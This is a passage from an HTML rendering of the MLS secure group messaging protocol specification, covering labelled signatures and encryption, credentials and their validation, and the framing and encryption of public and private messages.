VerifyWithLabel(VerificationKey, Label, Content, SignatureValue) =
    Signature.Verify(VerificationKey, SignContent, SignatureValue)
</pre><p><a href="#section-5.1.2-4">¬∂</a>
</p></div>
<p id="section-5.1.2-5">Where SignContent is specified as:<a href="#section-5.1.2-5">¬∂</a></p>
<div id="section-5.1.2-6">
<pre>struct {
    opaque label&lt;V&gt;;
    opaque content&lt;V&gt;;
} SignContent;
</pre><p><a href="#section-5.1.2-6">¬∂</a>
</p></div>
<p id="section-5.1.2-7">And its fields are set to:<a href="#section-5.1.2-7">¬∂</a></p>
<div id="section-5.1.2-8">
<pre>label = "MLS 1.0 " + Label;
content = Content;
</pre><p><a href="#section-5.1.2-8">¬∂</a>
</p></div>
<p id="section-5.1.2-9">The functions <code>Signature.Sign</code> and <code>Signature.Verify</code> are defined by the
signature algorithm.  If MLS extensions require signatures by group members,
they should reuse the SignWithLabel construction, using a distinct label.  To
avoid collisions in these labels, an IANA registry is defined in
<a href="#mls-signature-labels">Section 17.6</a>.<a href="#section-5.1.2-9">¬∂</a></p>
</section>
<section id="public-key-encryption">
          <h4 id="name-public-key-encryption">
<a href="#section-5.1.3">5.1.3. </a><a href="#name-public-key-encryption">Public Key Encryption</a>
          </h4>
<p id="section-5.1.3-1">As with signing, MLS includes a label and context in encryption operations to
avoid confusion between ciphertexts produced for different purposes.  Encryption
and decryption including this label and context are done as follows:<a href="#section-5.1.3-1">¬∂</a></p>
<div id="section-5.1.3-2">
<pre>EncryptWithLabel(PublicKey, Label, Context, Plaintext) =
  SealBase(PublicKey, EncryptContext, "", Plaintext)

DecryptWithLabel(PrivateKey, Label, Context, KEMOutput, Ciphertext) =
  OpenBase(KEMOutput, PrivateKey, EncryptContext, "", Ciphertext)
</pre><p><a href="#section-5.1.3-2">¬∂</a>
</p></div>
<p id="section-5.1.3-3">Where EncryptContext is specified as:<a href="#section-5.1.3-3">¬∂</a></p>
<div id="section-5.1.3-4">
<pre>struct {
  opaque label&lt;V&gt;;
  opaque context&lt;V&gt;;
} EncryptContext;
</pre><p><a href="#section-5.1.3-4">¬∂</a>
</p></div>
<p id="section-5.1.3-5">And its fields are set to:<a href="#section-5.1.3-5">¬∂</a></p>
<div id="section-5.1.3-6">
<pre>label = "MLS 1.0 " + Label;
context = Context;
</pre><p><a href="#section-5.1.3-6">¬∂</a>
</p></div>
<p id="section-5.1.3-7">The functions <code>SealBase</code> and <code>OpenBase</code> are defined in <span><a href="https://www.rfc-editor.org/rfc/rfc9180#section-6.1">Section 6.1</a> of [<a href="#RFC9180">RFC9180</a>]</span> (with "Base" as the MODE), using the HPKE algorithms specified by the
group's cipher suite.  If MLS extensions require HPKE encryption operations, they
should reuse the EncryptWithLabel construction, using a distinct label.  To
avoid collisions in these labels, an IANA registry is defined in
<a href="#mls-public-key-encryption-labels">Section 17.7</a>.<a href="#section-5.1.3-7">¬∂</a></p>
</section>
</section>
<section id="hash-based-identifiers">
        <h3 id="name-hash-based-identifiers">
<a href="#section-5.2">5.2. </a><a href="#name-hash-based-identifiers">Hash-Based Identifiers</a>
        </h3>
<p id="section-5.2-1">Some MLS messages refer to other MLS objects by hash.  For example, Welcome
messages refer to KeyPackages for the members being welcomed, and Commits refer
to Proposals they cover.  These identifiers are computed as follows:<a href="#section-5.2-1">¬∂</a></p>
<div id="section-5.2-2">
<pre>opaque HashReference&lt;V&gt;;

HashReference KeyPackageRef;
HashReference ProposalRef;
</pre><p><a href="#section-5.2-2">¬∂</a>
</p></div>
<div id="section-5.2-3">
<pre>MakeKeyPackageRef(value)
  = RefHash("MLS 1.0 KeyPackage Reference", value)

MakeProposalRef(value)
  = RefHash("MLS 1.0 Proposal Reference", value)

RefHash(label, value) = Hash(RefHashInput)
</pre><p><a href="#section-5.2-3">¬∂</a>
</p></div>
<p id="section-5.2-4">Where RefHashInput is defined as:<a href="#section-5.2-4">¬∂</a></p>
<div id="section-5.2-5">
<pre>struct {
  opaque label&lt;V&gt;;
  opaque value&lt;V&gt;;
} RefHashInput;
</pre><p><a href="#section-5.2-5">¬∂</a>
</p></div>
<p id="section-5.2-6">And its fields are set to:<a href="#section-5.2-6">¬∂</a></p>
<div id="section-5.2-7">
<pre>label = label;
value = value;
</pre><p><a href="#section-5.2-7">¬∂</a>
</p></div>
<p id="section-5.2-8">For a KeyPackageRef, the <code>value</code> input is the encoded KeyPackage, and the
cipher suite specified in the KeyPackage determines the KDF used.  For a
ProposalRef, the <code>value</code> input is the AuthenticatedContent carrying the
Proposal.  In the latter two cases, the KDF is determined by the group's
cipher suite.<a href="#section-5.2-8">¬∂</a></p>
</section>
<section id="credentials">
        <h3 id="name-credentials">
<a href="#section-5.3">5.3. </a><a href="#name-credentials">Credentials</a>
        </h3>
<p id="section-5.3-1">Each member of a group presents a credential that provides one or more
identities for the member and associates them with the member's signing key.
The identities and signing key are verified by the Authentication Service in use
for a group.<a href="#section-5.3-1">¬∂</a></p>
<p id="section-5.3-2">It is up to the application to decide which identifiers to use at
the application level.  For example,
a certificate in an X509Credential may attest to several domain names or email
addresses in its subjectAltName extension.  An application may decide to
present all of these to a user, or if it knows a "desired" domain name or email
address, it can check that the desired identifier is among those attested.
Using the terminology from <span>[<a href="#RFC6125">RFC6125</a>]</span>, a credential provides "presented
identifiers", and it is up to the application to supply a "reference identifier"
for the authenticated client, if any.<a href="#section-5.3-2">¬∂</a></p>
<div id="section-5.3-3">
<pre>// See the "MLS Credential Types" IANA registry for values
uint16 CredentialType;

struct {
    opaque cert_data&lt;V&gt;;
} Certificate;

struct {
    CredentialType credential_type;
    select (Credential.credential_type) {
        case basic:
            opaque identity&lt;V&gt;;

        case x509:
            Certificate certificates&lt;V&gt;;
    };
} Credential;
</pre><p><a href="#section-5.3-3">¬∂</a>
</p></div>
<p id="section-5.3-4">A "basic" credential is a bare assertion of an identity, without any additional
information.  The format of the encoded identity is defined by the application.<a href="#section-5.3-4">¬∂</a></p>
<p id="section-5.3-5">For an X.509 credential, each entry in the <code>certificates</code> field represents a single DER-encoded
X.509 certificate. The chain is ordered such that the first entry (certificates[0]) is
the end-entity certificate. The public key encoded in the
<code>subjectPublicKeyInfo</code> of the end-entity certificate <span>MUST</span> be identical to the
<code>signature_key</code> in the LeafNode containing this credential. A chain <span>MAY</span> omit any
non-leaf certificates that supported peers are known to already possess.<a href="#section-5.3-5">¬∂</a></p>
<section id="credential-validation">
          <h4 id="name-credential-validation">
<a href="#section-5.3.1">5.3.1. </a><a href="#name-credential-validation">Credential Validation</a>
          </h4>
<p id="section-5.3.1-1">The application using MLS is responsible for specifying which identifiers it
finds acceptable for each member in a group.  In other words, following the
model that <span>[<a href="#RFC6125">RFC6125</a>]</span> describes for TLS, the application maintains a list of
"reference identifiers" for the members of a group, and the credentials provide
"presented identifiers".  A member of a group is authenticated by first
validating that the member's credential legitimately represents some presented
identifiers, and then ensuring that the reference identifiers for the member are
authenticated by those presented identifiers.<a href="#section-5.3.1-1">¬∂</a></p>
<p id="section-5.3.1-2">The parts of the system that perform these functions are collectively referred
to as the Authentication Service (AS) <span>[<a href="#I-D.ietf-mls-architecture">MLS-ARCH</a>]</span>.  A
member's credential is said to be <em>validated with the AS</em> when the AS verifies
that the credential's presented identifiers are correctly associated with the
<code>signature_key</code> field in the member's LeafNode, and that those
identifiers match the reference identifiers for the member.<a href="#section-5.3.1-2">¬∂</a></p>
<p id="section-5.3.1-3">Whenever a new credential is introduced in the group, it <span>MUST</span> be validated with
the AS.  In particular, at the following events in the protocol:<a href="#section-5.3.1-3">¬∂</a></p>
<ul>
<li id="section-5.3.1-4.1">When a member receives a KeyPackage that it will use in an Add proposal to add
a new member to the group<a href="#section-5.3.1-4.1">¬∂</a>
</li>
            <li id="section-5.3.1-4.2">When a member receives a GroupInfo object that it will use to join a group,
either via a Welcome or via an external Commit<a href="#section-5.3.1-4.2">¬∂</a>
</li>
            <li id="section-5.3.1-4.3">When a member receives an Add proposal adding a member to the group<a href="#section-5.3.1-4.3">¬∂</a>
</li>
            <li id="section-5.3.1-4.4">When a member receives an Update proposal whose LeafNode has a new credential
for the member<a href="#section-5.3.1-4.4">¬∂</a>
</li>
            <li id="section-5.3.1-4.5">When a member receives a Commit with an UpdatePath whose LeafNode has a new
credential for the committer<a href="#section-5.3.1-4.5">¬∂</a>
</li>
            <li id="section-5.3.1-4.6">When an <code>external_senders</code> extension is added to the group<a href="#section-5.3.1-4.6">¬∂</a>
</li>
            <li id="section-5.3.1-4.7">When an existing <code>external_senders</code> extension is updated<a href="#section-5.3.1-4.7">¬∂</a>
</li>
          </ul>
<p id="section-5.3.1-5">In cases where a member's credential is being replaced, such as the Update and
Commit cases above, the AS <span>MUST</span> also verify that the set of presented
identifiers in the new credential is valid as a successor to the set of
presented identifiers in the old credential, according to the application's
policy.<a href="#section-5.3.1-5">¬∂</a></p>
</section>
<section id="credential-expiry-and-revocation">
          <h4 id="name-credential-expiry-and-revoc">
<a href="#section-5.3.2">5.3.2. </a><a href="#name-credential-expiry-and-revoc">Credential Expiry and Revocation</a>
          </h4>
<p id="section-5.3.2-1">In some credential schemes, a valid credential can "expire" or become invalid
after a certain point in time. For example, each X.509 certificate has a
<code>notAfter</code> field, expressing a time after which the certificate is not valid.<a href="#section-5.3.2-1">¬∂</a></p>
<p id="section-5.3.2-2">Expired credentials can cause operational problems in light of the validation
requirements of <a href="#credential-validation">Section 5.3.1</a>.  Applications can apply some
operational practices and adaptations to Authentication Service policies to
moderate these impacts.<a href="#section-5.3.2-2">¬∂</a></p>
<p id="section-5.3.2-3">In general, to avoid operational problems such as new joiners rejecting expired
credentials in a group, applications that use such credentials should ensure to
the extent practical that all of the credentials in use in a group are valid at
all times.<a href="#section-5.3.2-3">¬∂</a></p>
<p id="section-5.3.2-4">If a member finds that its credential has expired (or will soon), it should
issue an Update or Commit that replaces it with a valid credential.  For this
reason, members <span>SHOULD</span> accept Update proposals and Commits issued by members
with expired credentials, if the credential in the Update or Commit is valid.<a href="#section-5.3.2-4">¬∂</a></p>
<p id="section-5.3.2-5">Similarly, when a client is processing messages sent some time in the past
(e.g., syncing up with a group after being offline), the client <span>SHOULD</span> accept
signatures from members with expired credentials, since the credential may
have been valid at the time the message was sent.<a href="#section-5.3.2-5">¬∂</a></p>
<p id="section-5.3.2-6">If a member finds that another member's credential has expired, they may issue a
Remove that removes that member.  For example, an application could require a
member preparing to issue a Commit to check the tree for expired credentials and
include Remove proposals for those members in its Commit.  In situations where
the group tree is known to the DS, the DS could also monitor the tree for
expired credentials and issue external Remove proposals.<a href="#section-5.3.2-6">¬∂</a></p>
<p id="section-5.3.2-7">Some credential schemes also allow credentials to be revoked.  Revocation is
similar to expiry in that a previously valid credential becomes invalid.
As such, most of the considerations above also apply to revoked credentials.
However, applications may want to treat revoked credentials differently, e.g.,
by removing members with revoked credentials while allowing members with expired
credentials time to update.<a href="#section-5.3.2-7">¬∂</a></p>
</section>
<section id="uniquely-identifying-clients">
          <h4 id="name-uniquely-identifying-client">
<a href="#section-5.3.3">5.3.3. </a><a href="#name-uniquely-identifying-client">Uniquely Identifying Clients</a>
          </h4>
<p id="section-5.3.3-1">MLS implementations will presumably provide applications with a way to request
protocol operations with regard to other clients (e.g., removing clients).  Such
functions will need to refer to the other clients using some identifier.  MLS
clients have a few types of identifiers, with different operational properties.<a href="#section-5.3.3-1">¬∂</a></p>
<p id="section-5.3.3-2">Internally to the protocol, group members are uniquely identified by their leaf
index. However, a leaf index is only valid for referring to members in a given
epoch. The same leaf index may represent a different member, or no member at
all, in a subsequent epoch.<a href="#section-5.3.3-2">¬∂</a></p>
<p id="section-5.3.3-3">The Credentials presented by the clients in a group authenticate
application-level identifiers for the clients.  However, these identifiers may not
uniquely identify clients.  For example, if a user has multiple devices that are
all present in an MLS group, then those devices' clients could all present the
user's application-layer identifiers.<a href="#section-5.3.3-3">¬∂</a></p>
<p id="section-5.3.3-4">If needed, applications may add application-specific identifiers to the
<code>extensions</code> field of a LeafNode object with the <code>application_id</code> extension.<a href="#section-5.3.3-4">¬∂</a></p>
<div id="section-5.3.3-5">
<pre>opaque application_id&lt;V&gt;;
</pre><p><a href="#section-5.3.3-5">¬∂</a>
</p></div>
<p id="section-5.3.3-6">However, applications <span>MUST NOT</span> rely on the data in an <code>application_id</code> extension
as if it were authenticated by the Authentication Service, and <span>SHOULD</span> gracefully
handle cases where the identifier presented is not unique.<a href="#section-5.3.3-6">¬∂</a></p>
</section>
</section>
</section>
<section id="message-framing">
      <h2 id="name-message-framing">
<a href="#section-6">6. </a><a href="#name-message-framing">Message Framing</a>
      </h2>
<p id="section-6-1">Handshake and application messages use a common framing structure.
This framing provides encryption to ensure confidentiality within the
group, as well as signing to authenticate the sender.<a href="#section-6-1">¬∂</a></p>
<p id="section-6-2">In most of the protocol, messages are handled in the form of
AuthenticatedContent objects.  These structures contain the content of the
message itself as well as information to authenticate the sender (see
<a href="#content-authentication">Section 6.1</a>).  The additional protections required to transmit
these messages over an untrusted channel (group membership authentication or
AEAD encryption) are added by encoding the AuthenticatedContent as a
PublicMessage or PrivateMessage message, which can then be sent as an MLSMessage.
Likewise, these protections are enforced (via membership verification or AEAD
decryption) when decoding a PublicMessage or PrivateMessage into an
AuthenticatedContent object.<a href="#section-6-2">¬∂</a></p>
<p id="section-6-3">PrivateMessage represents a signed and encrypted message, with
protections for both the content of the message and related
metadata.  PublicMessage represents a message that is only signed,
and not encrypted.  Applications <span>MUST</span> use PrivateMessage to encrypt
application messages and <span>SHOULD</span> use PrivateMessage to encode
handshake messages, but they <span>MAY</span> transmit handshake messages encoded
as PublicMessage objects in cases where it is necessary for the
Delivery Service to examine such messages.<a href="#section-6-3">¬∂</a></p>
<div id="section-6-4">
<pre>enum {
    reserved(0),
    mls10(1),
    (65535)
} ProtocolVersion;

enum {
    reserved(0),
    application(1),
    proposal(2),
    commit(3),
    (255)
} ContentType;

enum {
    reserved(0),
    member(1),
    external(2),
    new_member_proposal(3),
    new_member_commit(4),
    (255)
} SenderType;

struct {
    SenderType sender_type;
    select (Sender.sender_type) {
        case member:
            uint32 leaf_index;
        case external:
            uint32 sender_index;
        case new_member_commit:
        case new_member_proposal:
            struct{};
    };
} Sender;

// See the "MLS Wire Formats" IANA registry for values
uint16 WireFormat;

struct {
    opaque group_id&lt;V&gt;;
    uint64 epoch;
    Sender sender;
    opaque authenticated_data&lt;V&gt;;

    ContentType content_type;
    select (FramedContent.content_type) {
        case application:
          opaque application_data&lt;V&gt;;
        case proposal:
          Proposal proposal;
        case commit:
          Commit commit;
    };
} FramedContent;

struct {
    ProtocolVersion version = mls10;
    WireFormat wire_format;
    select (MLSMessage.wire_format) {
        case mls_public_message:
            PublicMessage public_message;
        case mls_private_message:
            PrivateMessage private_message;
        case mls_welcome:
            Welcome welcome;
        case mls_group_info:
            GroupInfo group_info;
        case mls_key_package:
            KeyPackage key_package;
    };
} MLSMessage;
</pre><p><a href="#section-6-4">¬∂</a>
</p></div>
<p id="section-6-5">Messages from senders that aren't in the group are sent as PublicMessage. See
Sections <a href="#external-proposals">12.1.8</a> and <a href="#joining-via-external-commits">12.4.3.2</a> for more details.<a href="#section-6-5">¬∂</a></p>
<p id="section-6-6">The following structure is used to fully describe the data transmitted in
plaintexts or ciphertexts.<a href="#section-6-6">¬∂</a></p>
<div id="section-6-7">
<pre>struct {
    WireFormat wire_format;
    FramedContent content;
    FramedContentAuthData auth;
} AuthenticatedContent;
</pre><p><a href="#section-6-7">¬∂</a>
</p></div>
<p id="section-6-8">The following figure illustrates how the various structures described in this
section relate to each other, and the high-level operations used to produce and
consume them:<a href="#section-6-8">¬∂</a></p>
<span id="name-relationships-among-mls-obj"></span><figure id="figure-12">
        <div id="section-6-9.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="480" text-anchor="middle" version="1.1" viewBox="0 0 520 480" width="520">
              <path d="M 64,48 L 64,64" fill="none" stroke="black"></path>
              <path d="M 88,144 L 88,176" fill="none" stroke="black"></path>
              <path d="M 88,208 L 88,224" fill="none" stroke="black"></path>
              <path d="M 112,304 L 112,336" fill="none" stroke="black"></path>
              <path d="M 112,368 L 112,416" fill="none" stroke="black"></path>
              <path d="M 160,128 L 160,144" fill="none" stroke="black"></path>
              <path d="M 160,224 L 160,256" fill="none" stroke="black"></path>
              <path d="M 184,48 L 184,96" fill="none" stroke="black"></path>
              <path d="M 184,128 L 184,256" fill="none" stroke="black"></path>
              <path d="M 184,288 L 184,304" fill="none" stroke="black"></path>
              <path d="M 256,304 L 256,336" fill="none" stroke="black"></path>
              <path d="M 256,368 L 256,448" fill="none" stroke="black"></path>
              <path d="M 304,48 L 304,64" fill="none" stroke="black"></path>
              <path d="M 304,400 L 304,416" fill="none" stroke="black"></path>
              <path d="M 336,144 L 336,240" fill="none" stroke="black"></path>
              <path d="M 336,304 L 336,336" fill="none" stroke="black"></path>
              <path d="M 392,400 L 392,416" fill="none" stroke="black"></path>
              <path d="M 480,400 L 480,416" fill="none" stroke="black"></path>
              <path d="M 64,64 L 304,64" fill="none" stroke="black"></path>
              <path d="M 88,144 L 160,144" fill="none" stroke="black"></path>
              <path d="M 336,176 L 352,176" fill="none" stroke="black"></path>
              <path d="M 88,224 L 160,224" fill="none" stroke="black"></path>
              <path d="M 112,304 L 256,304" fill="none" stroke="black"></path>
              <path d="M 336,320 L 352,320" fill="none" stroke="black"></path>
              <path d="M 112,416 L 480,416" fill="none" stroke="black"></path>
              <path d="M 320,128 C 328.83064,128 336,135.16936 336,144" fill="none" stroke="black"></path>
              <path d="M 320,256 C 328.83064,256 336,248.83064 336,240" fill="none" stroke="black"></path>
              <path d="M 320,288 C 328.83064,288 336,295.16936 336,304" fill="none" stroke="black"></path>
              <path d="M 320,352 C 328.83064,352 336,344.83064 336,336" fill="none" stroke="black"></path>
              <polygon fill="black" points="264,448 252,442.4 252,453.6" transform="rotate(90,256,448)"></polygon>
              <polygon fill="black" points="264,336 252,330.4 252,341.6" transform="rotate(90,256,336)"></polygon>
              <polygon fill="black" points="192,256 180,250.4 180,261.6" transform="rotate(90,184,256)"></polygon>
              <polygon fill="black" points="192,96 180,90.4 180,101.6" transform="rotate(90,184,96)"></polygon>
              <polygon fill="black" points="168,256 156,250.4 156,261.6" transform="rotate(90,160,256)"></polygon>
              <polygon fill="black" points="120,336 108,330.4 108,341.6" transform="rotate(90,112,336)"></polygon>
              <polygon fill="black" points="96,176 84,170.4 84,181.6" transform="rotate(90,88,176)"></polygon>
              <g>
                <text x="68" y="36">Proposal</text>
                <text x="188" y="36">Commit</text>
                <text x="296" y="36">Application</text>
                <text x="364" y="36">Data</text>
                <text x="176" y="116">FramedContent</text>
                <text x="404" y="180">Asymmetric</text>
                <text x="88" y="196">FramedContentAuthData</text>
                <text x="380" y="196">Sign</text>
                <text x="408" y="196">/</text>
                <text x="444" y="196">Verify</text>
                <text x="188" y="276">AuthenticatedContent</text>
                <text x="400" y="324">Symmetric</text>
                <text x="392" y="340">Protect</text>
                <text x="432" y="340">/</text>
                <text x="480" y="340">Unprotect</text>
                <text x="112" y="356">PublicMessage</text>
                <text x="252" y="356">PrivateMessage</text>
                <text x="304" y="388">Welcome</text>
                <text x="388" y="388">KeyPackage</text>
                <text x="480" y="388">GroupInfo</text>
                <text x="260" y="468">MLSMessage</text>
              </g>
            </svg><p><a href="#section-6-9.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-12">Figure 12</a>:
<a href="#name-relationships-among-mls-obj">Relationships among MLS Objects</a>
        </figcaption></figure>
<section id="content-authentication">
        <h3 id="name-content-authentication">
<a href="#section-6.1">6.1. </a><a href="#name-content-authentication">Content Authentication</a>
        </h3>
<p id="section-6.1-1">FramedContent is authenticated using the FramedContentAuthData structure.<a href="#section-6.1-1">¬∂</a></p>
<div id="section-6.1-2">
<pre>struct {
    ProtocolVersion version = mls10;
    WireFormat wire_format;
    FramedContent content;
    select (FramedContentTBS.content.sender.sender_type) {
        case member:
        case new_member_commit:
            GroupContext context;
        case external:
        case new_member_proposal:
            struct{};
    };
} FramedContentTBS;

opaque MAC&lt;V&gt;;

struct {
    /* SignWithLabel(., "FramedContentTBS", FramedContentTBS) */
    opaque signature&lt;V&gt;;
    select (FramedContent.content_type) {
        case commit:
            /*
              MAC(confirmation_key,
                  GroupContext.confirmed_transcript_hash)
            */
            MAC confirmation_tag;
        case application:
        case proposal:
            struct{};
    };
} FramedContentAuthData;
</pre><p><a href="#section-6.1-2">¬∂</a>
</p></div>
<p id="section-6.1-3">The signature is computed using <code>SignWithLabel</code> with label
<code>"FramedContentTBS"</code> and with a content that covers the message content and
the wire format that will be used for this message. If the sender's
<code>sender_type</code> is <code>member</code>, the content also covers the GroupContext for the
current epoch so that signatures are specific to a given group and epoch.<a href="#section-6.1-3">¬∂</a></p>
<p id="section-6.1-4">The sender <span>MUST</span> use the private key corresponding to the following signature key
depending on the sender's <code>sender_type</code>:<a href="#section-6.1-4">¬∂</a></p>
<ul>
<li id="section-6.1-5.1">
            <code>member</code>: The signature key contained in the LeafNode at the index
indicated by <code>leaf_index</code> in the ratchet tree.<a href="#section-6.1-5.1">¬∂</a>
</li>
          <li id="section-6.1-5.2">
            <code>external</code>: The signature key at the index
indicated by <code>sender_index</code> in the <code>external_senders</code> group context
extension (see <a href="#external-senders-extension">Section 12.1.8.1</a>). The
<code>content_type</code> of the message <span>MUST</span> be <code>proposal</code> and the <code>proposal_type</code> <span>MUST</span> be a value that is allowed for external senders.<a href="#section-6.1-5.2">¬∂</a>
</li>
          <li id="section-6.1-5.3">
            <code>new_member_commit</code>: The signature key in the LeafNode in
  the Commit's path (see <a href="#joining-via-external-commits">Section 12.4.3.2</a>). The
  <code>content_type</code> of the message <span>MUST</span> be <code>commit</code>.<a href="#section-6.1-5.3">¬∂</a>
</li>
          <li id="section-6.1-5.4">
            <code>new_member_proposal</code>: The signature key in the LeafNode in
  the KeyPackage embedded in an external Add proposal. The
  <code>content_type</code> of the message <span>MUST</span> be <code>proposal</code> and the
  <code>proposal_type</code> of the Proposal <span>MUST</span> be <code>add</code>.<a href="#section-6.1-5.4">¬∂</a>
</li>
        </ul>
<p id="section-6.1-6">Recipients of an MLSMessage <span>MUST</span> verify the signature with the key depending on
the <code>sender_type</code> of the sender as described above.<a href="#section-6.1-6">¬∂</a></p>
<p id="section-6.1-7">The confirmation tag value confirms that the members of the group have arrived
at the same state of the group. A FramedContentAuthData is said to be valid when both
the <code>signature</code> and <code>confirmation_tag</code> fields are valid.<a href="#section-6.1-7">¬∂</a></p>
</section>
<section id="encoding-and-decoding-a-public-message">
        <h3 id="name-encoding-and-decoding-a-pub">
<a href="#section-6.2">6.2. </a><a href="#name-encoding-and-decoding-a-pub">Encoding and Decoding a Public Message</a>
        </h3>
<p id="section-6.2-1">Messages that are authenticated but not encrypted are encoded using the PublicMessage structure.<a href="#section-6.2-1">¬∂</a></p>
<div id="section-6.2-2">
<pre>struct {
    FramedContent content;
    FramedContentAuthData auth;
    select (PublicMessage.content.sender.sender_type) {
        case member:
            MAC membership_tag;
        case external:
        case new_member_commit:
        case new_member_proposal:
            struct{};
    };
} PublicMessage;
</pre><p><a href="#section-6.2-2">¬∂</a>
</p></div>
<p id="section-6.2-3">The <code>membership_tag</code> field in the PublicMessage object authenticates the sender's
membership in the group. For messages sent by members, it <span>MUST</span> be set to the
following value:<a href="#section-6.2-3">¬∂</a></p>
<div id="section-6.2-4">
<pre>struct {
  FramedContentTBS content_tbs;
  FramedContentAuthData auth;
} AuthenticatedContentTBM;
</pre><p><a href="#section-6.2-4">¬∂</a>
</p></div>
<div id="section-6.2-5">
<pre>membership_tag = MAC(membership_key, AuthenticatedContentTBM)
</pre><p><a href="#section-6.2-5">¬∂</a>
</p></div>
<p id="section-6.2-6">When decoding a PublicMessage into an AuthenticatedContent,
the application <span>MUST</span> check <code>membership_tag</code> and <span>MUST</span> check that the
FramedContentAuthData is valid.<a href="#section-6.2-6">¬∂</a></p>
</section>
<section id="encoding-and-decoding-a-private-message">
        <h3 id="name-encoding-and-decoding-a-pri">
<a href="#section-6.3">6.3. </a><a href="#name-encoding-and-decoding-a-pri">Encoding and Decoding a Private Message</a>
        </h3>
<p id="section-6.3-1">Authenticated and encrypted messages are encoded using the PrivateMessage structure.<a href="#section-6.3-1">¬∂</a></p>
<div id="section-6.3-2">
<pre>struct {
    opaque group_id&lt;V&gt;;
    uint64 epoch;
    ContentType content_type;
    opaque authenticated_data&lt;V&gt;;
    opaque encrypted_sender_data&lt;V&gt;;
    opaque ciphertext&lt;V&gt;;
} PrivateMessage;
</pre><p><a href="#section-6.3-2">¬∂</a>
</p></div>
<p id="section-6.3-3"><code>encrypted_sender_data</code> and <code>ciphertext</code> are encrypted using the AEAD function
specified by the cipher suite in use, using the SenderData
and PrivateMessageContent structures as input.<a href="#section-6.3-3">¬∂</a></p>
<section id="content-encryption">
          <h4 id="name-content-encryption">
<a href="#section-6.3.1">6.3.1. </a><a href="#name-content-encryption">Content Encryption</a>
          </h4>
<p id="section-6.3.1-1">Content to be encrypted is encoded in a PrivateMessageContent structure.<a href="#section-6.3.1-1">¬∂</a></p>
<div id="section-6.3.1-2">
<pre>struct {
    select (PrivateMessage.content_type) {
        case application:
          opaque application_data&lt;V&gt;;

        case proposal:
          Proposal proposal;

        case commit:
          Commit commit;
    };

    FramedContentAuthData auth;
    opaque padding[length_of_padding];
} PrivateMessageContent;
</pre><p><a href="#section-6.3.1-2">¬∂</a>
</p></div>
<p id="section-6.3.1-3">The <code>padding</code> field is set by the sender, by first encoding the content (via the
<code>select</code>) and the <code>auth</code> field, and then appending the chosen number of zero bytes.
A receiver identifies the padding field in a plaintext decoded from
<code>PrivateMessage.ciphertext</code> by first decoding the content and the <code>auth</code> field;
then the <code>padding</code> field comprises any remaining octets of plaintext.  The
<code>padding</code> field <span>MUST</span> be filled with all zero bytes.  A receiver <span>MUST</span> verify that
there are no non-zero bytes in the <code>padding</code> field, and if this check fails, the
enclosing PrivateMessage <span>MUST</span> be rejected as malformed.  This check ensures that
the padding process is deterministic, so that, for example, padding cannot be
used as a covert channel.<a href="#section-6.3.1-3">¬∂</a></p>
<p id="section-6.3.1-4">In the MLS key schedule, the sender creates two distinct key ratchets for
handshake and application messages for each member of the group. When encrypting
a message, the sender looks at the ratchets it derived for its own member and
chooses an unused generation from either the handshake ratchet or the application ratchet,
depending on the content type of the message. This generation of the ratchet is
used to derive a provisional nonce and key.<a href="#section-6.3.1-4">¬∂</a></p>
<p id="section-6.3.1-5">Before use in the encryption operation, the nonce is XORed with a fresh random
value to guard against reuse.  Because the key schedule generates nonces
deterministically, a client <span>MUST</span> keep persistent state as to where in the key
schedule it is; if this persistent state is lost or corrupted, a client might
reuse a generation that has already been used, causing reuse of a key/nonce pair.<a href="#section-6.3.1-5">¬∂</a></p>
<p id="section-6.3.1-6">To avoid this situation, the sender of a message <span>MUST</span> generate a fresh random
four-byte "reuse guard" value and XOR it with the first four bytes of the nonce
from the key schedule before using the nonce for encryption.  The sender <span>MUST</span>
include the reuse guard in the <code>reuse_guard</code> field of the sender data object, so
that the recipient of the message can use it to compute the nonce to be used for
decryption.<a href="#section-6.3.1-6">¬∂</a></p>
<div id="section-6.3.1-7">
<pre>+-+-+-+-+---------...---+
|   Key Schedule Nonce  |
+-+-+-+-+---------...---+
           XOR
+-+-+-+-+---------...---+
| Guard |       0       |
+-+-+-+-+---------...---+
           ===
+-+-+-+-+---------...---+
| Encrypt/Decrypt Nonce |
+-+-+-+-+---------...---+
</pre><p><a href="#section-6.3.1-7">¬∂</a>
</p></div>
<p id="section-6.3.1-8">The Additional Authenticated Data (AAD) input to the encryption
contains an object of the following form, with the values used to
identify the key and nonce:<a href="#section-6.3.1-8">¬∂</a></p>
<div id="section-6.3.1-9">
<pre>struct {
    opaque group_id&lt;V&gt;;
    uint64 epoch;
    ContentType content_type;
    opaque authenticated_data&lt;V&gt;;
} PrivateContentAAD;
</pre><p><a href="#section-6.3.1-9">¬∂</a>
</p></div>
<p id="section-6.3.1-10">When decoding a PrivateMessageContent, the application <span>MUST</span> check that the
FramedContentAuthData is valid.<a href="#section-6.3.1-10">¬∂</a></p>
<p id="section-6.3.1-11">It is up to the application to decide what <code>authenticated_data</code> to provide and
how much padding to add to a given message (if any).  The overall size of the
AAD and ciphertext <span>MUST</span> fit within the limits established for the group's AEAD
algorithm in <span>[<a href="#I-D.irtf-cfrg-aead-limits">CFRG-AEAD-LIMITS</a>]</span>.<a href="#section-6.3.1-11">¬∂</a></p>
</section>
<section id="sender-data-encryption">
          <h4 id="name-sender-data-encryption">
<a href="#section-6.3.2">6.3.2. </a><a href="#name-sender-data-encryption">Sender Data Encryption</a>
          </h4>
<p id="section-6.3.2-1">The "sender data" used to look up the key for content encryption is
encrypted with the cipher suite's AEAD with a key and nonce derived from both the
<code>sender_data_secret</code> and a sample of the encrypted content. Before being
encrypted, the sender data is encoded as an object of the following form:<a href="#section-6.3.2-1">¬∂</a></p>
<div id="section-6.3.2-2">
<pre>struct {
    uint32 leaf_index;
    uint32 generation;
    opaque reuse_guard[4];
} SenderData;
</pre><p><a href="#section-6.3.2-2">¬∂</a>
</p></div>
<p id="section-6.3.2-3">When constructing a SenderData object from a Sender object, the sender <span>MUST</span> verify
Sender.sender_type is <code>member</code> and use Sender.leaf_index for
SenderData.leaf_index.<a href="#section-6.3.2-3">¬∂</a></p>
<p id="section-6.3.2-4">The <code>reuse_guard</code> field contains a fresh random value used to avoid nonce reuse
in the case of state loss or corruption, as described in <a href="#content-encryption">Section 6.3.1</a>.<a href="#section-6.3.2-4">¬∂</a></p>
<p id="section-6.3.2-5">The key and nonce provided to the AEAD are computed as the KDF of the first
